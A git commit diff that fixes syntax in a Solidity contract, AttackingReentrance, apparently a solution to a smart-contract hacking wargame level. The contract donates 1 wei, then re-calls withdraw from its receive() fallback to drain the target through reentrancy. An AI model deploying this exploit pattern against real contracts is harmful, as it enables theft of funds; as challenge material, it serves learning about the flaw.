0d19ac15caf7087d7389230495e0e0c0a036ae74
Will McTighe <will@mctighe.net>
2022-07-07 15:33:36 +0100

    fix

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -6,17 +6,17 @@ contract AttackingReentrance {
     Reentrance private reentrance;
 
     constructor(address payable _contractAddress) payable {
-        reentrance = Reentrance(_contractAddress;
+        reentrance = Reentrance(_contractAddress);
     }
 
     function hackContract() external {
         // must use 1 rather than 1 ether given test
         reentrance.donate{value: 1}(address(this));
-        reentrance.withdraw()
+        reentrance.withdraw();
     }
 
     receive() external payable {
-        if (address(reentrance).balance() > 1) {
+        if (reentrance.balanceOf(address(this)) >= 1) {
             reentrance.withdraw();
         }
     }
